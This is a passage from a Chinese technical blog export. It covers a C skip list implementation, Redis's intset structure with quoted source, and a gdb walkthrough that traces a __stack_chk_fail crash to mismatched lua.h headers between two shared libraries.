<h5 id="3-2-新增节点后，如何更新跳表中对应的N条单链表？"><a href="#3-2-新增节点后，如何更新跳表中对应的N条单链表？" class="headerlink" title="3.2 新增节点后，如何更新跳表中对应的N条单链表？"></a>3.2 新增节点后，如何更新跳表中对应的N条单链表？</h5><p>举例说明，给定一个包含6个元素，层数为4的跳表，现在新增一个节点值为80，层数为5，插入前后的变化如下：</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image7.png"></p>
<p>可以看出，往跳表中插入元素，<strong>只需在遍历跳表的过程中，保存这5条链表待插入位置的前驱节点(红圈表示)，再分别对每条单链表执行插入操作即可，最后更新跳表的长度和层高</strong>。代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳表的插入 O(logN)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">skiplistAdd</span><span class="params">(Skiplist* obj, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">preNodes</span>[<span class="title">SKIPLIST_MAXLEVEL</span>];</span> <span class="comment">// 保存待插入节点的所有前驱节点的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = obj-&gt;level; i &lt; SKIPLIST_MAXLEVEL; ++i) &#123;</span><br><span class="line">        preNodes[i] = obj-&gt;head;					  <span class="comment">// 初始化值为附加头结点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于target, 沿当前层继续查找插入的位置</span></span><br><span class="line">        <span class="keyword">while</span>( p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; num) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        preNodes[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> newLevel = GetSkipNodeRandomLevel();		<span class="comment">// 计算新插入节点的层数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">newNode</span> =</span> skiplistNodeCreate(newLevel, num);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; newLevel; ++i) &#123;</span><br><span class="line">        newNode-&gt;level[i].next = preNodes[i]-&gt;level[i].next;</span><br><span class="line">        preNodes[i]-&gt;level[i].next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;level = max(obj-&gt;level, newLevel);         <span class="comment">// 完成插入动作后，更新跳跃表当前层数</span></span><br><span class="line">    ++obj-&gt;length;									<span class="comment">// 完成插入动作后，更新跳跃表长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-删除"><a href="#4-删除" class="headerlink" title="4. 删除"></a>4. 删除</h4><p>设计<code>bool skiplistErase(Skiplist* obj, int num)</code>方法实现跳表的删除，要点如下：</p>
<ul>
<li>遍历跳表，确认待删除的值是否存在，这步和跳表的查找操作类似。</li>
<li>设待删除节点的层数为N，需对N条单链表分别执行删除操作。</li>
<li>成功删除节点后，注意更新跳表的长度和层高。</li>
</ul>
<p>代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳跃表删除操作 O(logN)</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">skiplistErase</span><span class="params">(Skiplist* obj, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">preNodes</span>[<span class="title">SKIPLIST_MAXLEVEL</span>];</span> <span class="comment">// 存储所有待删除节点的前驱节点的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于num, 沿当前层继续查找</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; num) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        preNodes[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = p-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">    <span class="keyword">if</span> (p &amp;&amp; p-&gt;value == num) &#123;	</span><br><span class="line">        skiplistNodeDelete(obj, p, preNodes);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">skiplistNodeDelete</span><span class="params">(Skiplist *obj, SkiplistNode *cur, SkiplistNode **preNodes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; obj-&gt;level; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preNodes[i]-&gt;level[i].next == cur) &#123; <span class="comment">// 被删除的节点层数可能比跳表层数少，所以要加上这里的判断</span></span><br><span class="line">            preNodes[i]-&gt;level[i].next = cur-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果删除的节点是层数最大的，那么可能需要更新跳表长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = obj-&gt;level - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj-&gt;head-&gt;level[i].next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        --obj-&gt;level;</span><br><span class="line">    &#125;</span><br><span class="line">    --obj-&gt;length;</span><br><span class="line">    <span class="comment">// 释放被删除节点空间</span></span><br><span class="line">    <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-跳表的释放"><a href="#5-跳表的释放" class="headerlink" title="5. 跳表的释放"></a>5. 跳表的释放</h4><p>释放操作很简单。对于每个跳跃表节点，只需调1次<code>free()</code>即可。这也是<code>SkiplistNode</code>结构中<code>level</code>成员设计为柔性数组的好处。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">skiplistFree</span><span class="params">(Skiplist* obj)</span> &#123;</span><br><span class="line">    SkiplistNode *cur = obj-&gt;head-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">    SkiplistNode *d;</span><br><span class="line">    <span class="keyword">while</span>(cur) &#123;</span><br><span class="line">        d = cur;</span><br><span class="line">        cur = cur-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">        <span class="built_in">free</span>(d);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;head);		   </span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码参考:<a href="https://leetcode-cn.com/problems/design-skiplist/solution/tiao-yue-biao-cyu-yan-shi-xian-by-pcj700">https://leetcode-cn.com/problems/design-skiplist/solution/tiao-yue-biao-cyu-yan-shi-xian-by-pcj700</a></p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>【1】 <a href="https://www.jianshu.com/p/9d8296562806">Skip List–跳表</a></p>
<p>【2】《数据结构与算法分析 C语言描述》原书第2版 10.4.2 —— 跳跃表</p>
<p>【3】《Redis设计与实现》—— 第5章 跳跃表</p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(五)——整数集合</title>
    <url>/2020/12/06/2020-12-06-redis-note-05-intset/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Redis中，整数集合是集合键的底层之一。</p>
<p>当一个集合只包含整数元素，且这个集合中元素个数不多的情况下，Redis就会使用整数集合作为集合键的底层实现。</p>
<h3 id="1-整数集合的实现"><a href="#1-整数集合的实现" class="headerlink" title="1. 整数集合的实现"></a>1. 整数集合的实现</h3><span id="more"></span>

<h4 id="1-1-数据结构设计"><a href="#1-1-数据结构设计" class="headerlink" title="1.1 数据结构设计"></a>1.1 数据结构设计</h4><p>以Redis6.0源码为例，整数集合由<code>intset.c/intset</code>结构定义，数据结构设计如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">intset</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> encoding;			<span class="comment">// 编码方式</span></span><br><span class="line">    <span class="type">uint32_t</span> length;			<span class="comment">// 集合中的元素个数</span></span><br><span class="line">    <span class="type">int8_t</span> contents[];			<span class="comment">// 用于保存集合中的元素</span></span><br><span class="line">&#125; intset;</span><br></pre></td></tr></table></figure>

<ul>
<li>length属性表示整数集合中元素的个数。</li>
<li>集合中所有元素以<strong>有序、无重复</strong>的方式保存在contents数组。</li>
<li><strong>虽然contents是int8_t类型，但它本身不保存int8_t类型的元素</strong>。实际上，contents数组保存的元素类型由encoding属性决定，encoding属性有以下3种取值：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// intset.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTSET_ENC_INT16 (sizeof(int16_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTSET_ENC_INT32 (sizeof(int32_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTSET_ENC_INT64 (sizeof(int64_t))</span></span><br></pre></td></tr></table></figure>

<p>举例，如encoding取值为<code>INTSET_ENC_INT32</code>，表示contents数组保存的每个元素都是int32_t类型的整数。</p>
<p>下图表示一个包含3个类型为uint16_t的元素的整数集合：<br><img src="/2020/12/06/2020-12-06-redis-note-05-intset/image1.png"></p>
<p>当创建空的整数集合时，为了节约内存，默认的encoding取值为<code>INTSET_ENC_INT16</code>(参考<code>intset.c/intsetNew</code>的实现)</p>
<h4 id="1-2-升级操作"><a href="#1-2-升级操作" class="headerlink" title="1.2 升级操作"></a>1.2 升级操作</h4><p>考虑插入新元素a到整数集合S的场景：如果新元素所占字节大小大于整数集合中现有的任意一个元素所占字节大小(即<code>sizeof(a) &gt; S.encoding</code>），就需要先对整数集合执行<strong>升级</strong>操作后，再执行插入操作。</p>
<p>升级操作的要点如下：</p>
<ul>
<li>根据新元素类型，计算扩展后的整数集合需要分配的空间大小，并调用realloc分配空间。</li>
<li>将原整数集合中所有元素类型转换为和新元素相同，并将所有转化后的元素有序地放到正确的位置上。</li>
<li>将新元素添加到整数集合。<strong>升级后新元素放置的位置要么在最开头，要么在最结尾</strong>，其原因在于：<strong>能引发升级的新元素，它的值要么小于先前整数集合中的所有元素，要么大于所有元素。</strong></li>
</ul>
<p>升级操作的源码实现参考<code>intset.c/intsetUpgradeAndAdd</code>, 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> intset *<span class="title function_">intsetUpgradeAndAdd</span><span class="params">(intset *is, <span class="type">int64_t</span> value)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> curenc = intrev32ifbe(is-&gt;encoding);</span><br><span class="line">    <span class="type">uint8_t</span> newenc = _intsetValueEncoding(value);</span><br><span class="line">    <span class="type">int</span> length = intrev32ifbe(is-&gt;length);</span><br><span class="line">    <span class="type">int</span> prepend = value &lt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First set new encoding and resize */</span></span><br><span class="line">    is-&gt;encoding = intrev32ifbe(newenc);</span><br><span class="line">    is = intsetResize(is,intrev32ifbe(is-&gt;length)+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Upgrade back-to-front so we don&#x27;t overwrite values.</span></span><br><span class="line"><span class="comment">     * Note that the &quot;prepend&quot; variable is used to make sure we have an empty</span></span><br><span class="line"><span class="comment">     * space at either the beginning or the end of the intset. */</span></span><br><span class="line">    <span class="keyword">while</span>(length--)</span><br><span class="line">        _intsetSet(is,length+prepend,_intsetGetEncoded(is,length,curenc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the value at the beginning or the end. */</span></span><br><span class="line">    <span class="keyword">if</span> (prepend)</span><br><span class="line">        _intsetSet(is,<span class="number">0</span>,value);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _intsetSet(is,intrev32ifbe(is-&gt;length),value);</span><br><span class="line">    is-&gt;length = intrev32ifbe(intrev32ifbe(is-&gt;length)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外，Redis中的整数集合不支持降级操作。</p>
<h3 id="2-整数集合的API"><a href="#2-整数集合的API" class="headerlink" title="2. 整数集合的API"></a>2. 整数集合的API</h3><table>
<thead>
<tr>
<th align="left">API</th>
<th align="left">功能</th>
<th align="left">复杂度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">intset *intsetNew(void);</td>
<td align="left">创建空的整数集合</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">intset *intsetAdd(intset *is, int64_t value, uint8_t *success);</td>
<td align="left">插入新元素到整数集合</td>
<td align="left">O(N)</td>
</tr>
<tr>
<td align="left">intset *intsetRemove(intset *is, int64_t value, int *success);</td>
<td align="left">删除整数集合中的指定元素</td>
<td align="left">O(N)</td>
</tr>
<tr>
<td align="left">uint8_t intsetFind(intset *is, int64_t value);</td>
<td align="left">查询元素是否在整数集合中。用二分查找法实现</td>
<td align="left">O(logN)</td>
</tr>
</tbody></table>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>【1】《Redis设计与实现》 —— 第6章 整数集合</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>__stack_chk_fail栈溢出问题定位</title>
    <url>/2020/12/16/2020-12-16-stack-chk-fail-case/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>进程收到<code>SIGABRT</code>信号异常退出，异常调用栈显示<code>__stack_chk_fail</code></p>
<h3 id="原因分析和定位思路"><a href="#原因分析和定位思路" class="headerlink" title="原因分析和定位思路"></a>原因分析和定位思路</h3><p><strong>原因分析：</strong> <code>__stack_chk_fail</code>说明<strong>发生了缓冲区溢出，canary被破坏</strong>。这说明代码设置GCC编译选项<strong>fstack-protector</strong>，开启了<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">栈保护机制canary</a></p>
<p><strong>定位思路：</strong></p>
<span id="more"></span>

<ul>
<li>先通过反汇编找到<code>canary</code>在栈上的存放地址。</li>
<li>用GDB对<code>canary</code>的存放地址打数据断点，定位出导致栈破坏的指令，再结合C代码具体分析。</li>
</ul>
<h3 id="定位过程"><a href="#定位过程" class="headerlink" title="定位过程"></a>定位过程</h3><p>以下给出一个简化案例：一个可执行程序test, 依赖两个.so：<code>libcomp1.so</code>, <code>libcomp2.so</code>。执行<code>test</code>程序后会异常退出，调用栈显示<code>__stack_chk_fail</code></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">├── CMakeLists.txt			—— 可执行程序 test, 依赖libcomp1.so, libcomp2.so</span><br><span class="line">├── comp1</span><br><span class="line">│   ├── CMakeLists.txt		—— libcomp1.so</span><br><span class="line">│   ├── comp1.c</span><br><span class="line">│   ├── lua.h</span><br><span class="line">├── comp2</span><br><span class="line">│   ├── CMakeLists.txt		-- libcomp2.so</span><br><span class="line">│   ├── comp2.c</span><br><span class="line">│   ├── lua.h</span><br><span class="line">├── main.c</span><br></pre></td></tr></table></figure>

<p>C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span>;	<span class="comment">// defined in libcomp1.so</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func1();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// comp1/comp1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lua.h&quot;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">func2</span><span class="params">(<span class="keyword">struct</span> lua_Debug *a, <span class="type">char</span> *b, <span class="type">int</span> c)</span>; <span class="comment">// defined in libcomp2.so</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lua_Debug</span> <span class="title">a</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *b = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    func2(&amp;a, b, c);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// comp2/comp2.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lua.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">(<span class="keyword">struct</span> lua_Debug *a, <span class="type">char</span> *b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    a-&gt;i_ci = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用GDB调试test程序，出现如下的异常调用栈</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50</span><br><span class="line">#1  0x00007ffff7e1c535 in __GI_abort () at abort.c:79</span><br><span class="line">#2  0x00007ffff7e73508 in __libc_message (action=&lt;optimized out&gt;, fmt=fmt@entry=0x7ffff7f7e07b &quot;*** %s ***: %s terminated\n&quot;)</span><br><span class="line">    at ../sysdeps/posix/libc_fatal.c:181</span><br><span class="line">#3  0x00007ffff7f0480d in __GI___fortify_fail_abort (need_backtrace=need_backtrace@entry=false,</span><br><span class="line">    msg=msg@entry=0x7ffff7f7e059 &quot;stack smashing detected&quot;) at fortify_fail.c:28</span><br><span class="line">#4  0x00007ffff7f047c2 in __stack_chk_fail () at stack_chk_fail.c:29</span><br><span class="line">#5  0x00007ffff7fca189 in func1 () at /home/pc/LUA/comp1/comp1.c:13</span><br><span class="line">#6  0x0000555555555143 in main () at /home/pc/LUA/main.c:7</span><br></pre></td></tr></table></figure>

<p>第4帧出现<code>__stack_chk_fail</code>，这表示程序出现了栈溢出。定位思路如下：</p>
<h4 id="1-先通过反汇编找到canary在栈上的存放地址。"><a href="#1-先通过反汇编找到canary在栈上的存放地址。" class="headerlink" title="1. 先通过反汇编找到canary在栈上的存放地址。"></a>1. 先通过反汇编找到<code>canary</code>在栈上的存放地址。</h4><p>用gdb查看出现<code>__stack_chk_fail</code>的前一个函数帧，即第5帧的汇编代码。通过<code>frame</code>命令切换函数帧，<code>disassemble</code>查看反汇编代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) frame 5</span><br><span class="line">#5  0x00007ffff7fca189 in func1 () at /home/pc/LUA/comp1/comp1.c:13</span><br><span class="line">13      &#125;</span><br><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function func1:</span><br><span class="line">   0x00007ffff7fca115 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x00007ffff7fca116 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x00007ffff7fca119 &lt;+4&gt;:     sub    $0x90,%rsp				# 栈上共分配144字节空间: (8字节canary + 120字节lua_Debug + 8字节char * + 4字节int, 4字节对齐 = 144字节)</span><br><span class="line">   0x00007ffff7fca120 &lt;+11&gt;:    mov    %fs:0x28,%rax			# %fs:0x28说明，canary值是通过段寻址方式从内存中读入的</span><br><span class="line">   0x00007ffff7fca129 &lt;+20&gt;:    mov    %rax,-0x8(%rbp)			# 将canary存储到栈中，位于$rbp - 0x8处</span><br><span class="line">   0x00007ffff7fca12d &lt;+24&gt;:    xor    %eax,%eax</span><br><span class="line">   0x00007ffff7fca12f &lt;+26&gt;:    lea    -0x80(%rbp),%rdx			# comp1.c/func1(): struct lua_Debug a = &#123;0&#125;;</span><br><span class="line">   0x00007ffff7fca133 &lt;+30&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x00007ffff7fca138 &lt;+35&gt;:    mov    $0xf,%ecx</span><br><span class="line">   0x00007ffff7fca13d &lt;+40&gt;:    mov    %rdx,%rdi</span><br><span class="line">   0x00007ffff7fca140 &lt;+43&gt;:    rep stos %rax,%es:(%rdi)</span><br><span class="line">   0x00007ffff7fca143 &lt;+46&gt;:    movq   $0x12345678,-0x88(%rbp)	# comp1.c/func1(): char *b = 0x12345678;</span><br><span class="line">   0x00007ffff7fca14e &lt;+57&gt;:    movl   $0xffffffff,-0x8c(%rbp)	# comp1.c/func1(): int c = 0xFFFFFFFF;</span><br><span class="line">   0x00007ffff7fca158 &lt;+67&gt;:    mov    -0x8c(%rbp),%edx			# c</span><br><span class="line">   0x00007ffff7fca15e &lt;+73&gt;:    mov    -0x88(%rbp),%rcx			# b</span><br><span class="line">   0x00007ffff7fca165 &lt;+80&gt;:    lea    -0x80(%rbp),%rax			# a</span><br><span class="line">   0x00007ffff7fca169 &lt;+84&gt;:    mov    %rcx,%rsi</span><br><span class="line">   0x00007ffff7fca16c &lt;+87&gt;:    mov    %rax,%rdi</span><br><span class="line">   0x00007ffff7fca16f &lt;+90&gt;:    callq  0x7ffff7fca040 &lt;func2@plt&gt;</span><br><span class="line">   0x00007ffff7fca174 &lt;+95&gt;:    nop</span><br><span class="line">   0x00007ffff7fca175 &lt;+96&gt;:    mov    -0x8(%rbp),%rax</span><br><span class="line">   0x00007ffff7fca179 &lt;+100&gt;:   xor    %fs:0x28,%rax			 # 从段寄存器取出canary的值，和栈上$rbp - 0x8处比较，如果发现canary被修改, 调用__stack_chk_fail进行错误处理</span><br><span class="line">   0x00007ffff7fca182 &lt;+109&gt;:   je     0x7ffff7fca189 &lt;func1+116&gt;</span><br><span class="line">   0x00007ffff7fca184 &lt;+111&gt;:   callq  0x7ffff7fca030 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">=&gt; 0x00007ffff7fca189 &lt;+116&gt;:   leaveq # movq %rbp %rsp, popq %rbp</span><br><span class="line">   0x00007ffff7fca18a &lt;+117&gt;:   retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p><code>0x00007ffff7fca119：sub $0x90,%rsp</code>：表示栈上分配了<strong>144</strong>个字节，依次存放三个局部变量a, b, c</p>
<p><code>0x00007ffff7fca120 &lt;+11&gt;: mov  %fs:0x28,%rax</code>：其中指令参数<code>$fs:0x28</code>说明<code>canary</code><strong>通过段寻址从内存中读入。canary值存放在一个特殊的段中，标志为只读，这样攻击者就无法覆盖canary的值。</strong></p>
<p><code>0x00007ffff7fca129 &lt;+20&gt;: mov %rax,-0x8(%rbp)</code>：说明canary在栈上存放地址是<code>$rbp - 0x8</code>。</p>
<p>根据x86_64过程调用的函数参数传递规则，可确定栈上所有局部变量和<code>canary</code>是如何存放的。<code>func1</code>的栈组织如下：</p>
<p><img src="/2020/12/16/2020-12-16-stack-chk-fail-case/image1.png"></p>
<h4 id="2-用GDB对canary的存放地址打数据断点，定位出导致栈破坏的指令"><a href="#2-用GDB对canary的存放地址打数据断点，定位出导致栈破坏的指令" class="headerlink" title="2. 用GDB对canary的存放地址打数据断点，定位出导致栈破坏的指令"></a>2. 用GDB对<code>canary</code>的存放地址打数据断点，定位出导致栈破坏的指令</h4><p>对<code>func1</code>打断点，重新执行程序，接着用<code>watch</code>命令，对<code>canary</code>的存放地址打数据断点，操作如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function func1:</span><br><span class="line">   0x00007ffff7fca115 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x00007ffff7fca116 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x00007ffff7fca119 &lt;+4&gt;:     sub    $0x90,%rsp</span><br><span class="line">   0x00007ffff7fca120 &lt;+11&gt;:    mov    %fs:0x28,%rax</span><br><span class="line">   0x00007ffff7fca129 &lt;+20&gt;:    mov    %rax,-0x8(%rbp)</span><br><span class="line">=&gt; 0x00007ffff7fca12d &lt;+24&gt;:    xor    %eax,%eax</span><br><span class="line">   0x00007ffff7fca12f &lt;+26&gt;:    lea    -0x80(%rbp),%rdx</span><br><span class="line">   ......</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) p $rbp - 0x8</span><br><span class="line">$8 = (void *) 0x7fffffffe4a8</span><br><span class="line">(gdb) watch *0x7fffffffe4a8							# 此处对canary在栈中存放的地址打数据断点！</span><br><span class="line">Hardware watchpoint 2: *0x7fffffffe4a8</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: *0x7fffffffe4a8</span><br><span class="line">Old value = 1303192064</span><br><span class="line">New value = 1</span><br><span class="line"></span><br><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function func2:</span><br><span class="line">   0x00007ffff7fc50f5 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x00007ffff7fc50f6 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x00007ffff7fc50f9 &lt;+4&gt;:     mov    %rdi,-0x8(%rbp)     # 第一个入参，lua_Debug *a</span><br><span class="line">   0x00007ffff7fc50fd &lt;+8&gt;:     mov    %rsi,-0x10(%rbp)</span><br><span class="line">   0x00007ffff7fc5101 &lt;+12&gt;:    mov    %edx,-0x14(%rbp)</span><br><span class="line">   0x00007ffff7fc5104 &lt;+15&gt;:    mov    -0x8(%rbp),%rax	   # 第一个入参，lua_Debug *a</span><br><span class="line">   0x00007ffff7fc5108 &lt;+19&gt;:    movq   $0x1,0x78(%rax)     # comp2.c/func2(): a-&gt;i_ci = 1; 这句导致canary被破坏</span><br><span class="line">=&gt; 0x00007ffff7fc5110 &lt;+27&gt;:    nop 	# 箭头指向的指令表示下一步即将执行的指令，也就是说是上一条指令movq $0x1,0x78(%rax)触发的数据断点!</span><br><span class="line">   0x00007ffff7fc5111 &lt;+28&gt;:    pop    %rbp</span><br><span class="line">   0x00007ffff7fc5112 &lt;+29&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>数据断点被触发，定位出<code>0x00007ffff7fc5108: $0x1,0x78(%rax)</code>导致<code>canary</code>破坏，结合汇编上下文和C码确定，这条指令关联的C语句是<code>a-&gt;i_ci = 1;</code></p>
<h4 id="为什么对lua-Debug结构体的成员赋值会导致栈溢出？"><a href="#为什么对lua-Debug结构体的成员赋值会导致栈溢出？" class="headerlink" title="为什么对lua_Debug结构体的成员赋值会导致栈溢出？"></a>为什么对lua_Debug结构体的成员赋值会导致栈溢出？</h4><p>由<code>$0x1,0x78(%rax)</code>可以确定<code>i_ci</code>成员距离结构体首地址的偏移为0x78，即120字节。事实上，在<code>func2</code>的函数帧中，<code>lua_Debug</code>结构体大小为128字节，而<code>func1</code>中的<code>lua_Debug</code>结构体只有120字节。</p>
<p>结合<code>func1</code>的栈帧发现栈溢出的直接原因：<font color = 'red'><strong>a-&gt;i_ci &#x3D; 1; 语句执行后，恰好导致canary的值被改写为1。</font></strong></p>
<p>通过<code>gdb</code>也能发现两个.so中的结构体大小不一致问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) f 1</span><br><span class="line">#1  0x00007ffff7fca174 in func1 () at /home/pc/LUA/comp1/comp1.c:11</span><br><span class="line">11          func2(&amp;a, b, c);</span><br><span class="line">(gdb) p sizeof(struct lua_Debug)</span><br><span class="line">$24 = 120							# func1中结构体大小为120</span><br><span class="line">(gdb) f 0</span><br><span class="line">#0  func2 (a=0x7fffffffe430, b=0x12345678 &lt;error: Cannot access memory at address 0x12345678&gt;, c=-1) at /home/pc/LUA/comp2/comp2.c:5</span><br><span class="line">5           return;</span><br><span class="line">(gdb) p sizeof(struct lua_Debug)</span><br><span class="line">$27 = 128							# func2中结构体大小为128</span><br></pre></td></tr></table></figure>

<p><code>lua_Debug</code>结构体在<code>lua.h</code>定义的，这个错误原因是<strong>由于两个.so编译使用的lua.h头文件不一致，导致栈溢出问题。</strong>以下分别给出两个.so的<code>lua.h</code>：</p>
<p><img src="/2020/12/16/2020-12-16-stack-chk-fail-case/image2.png"></p>
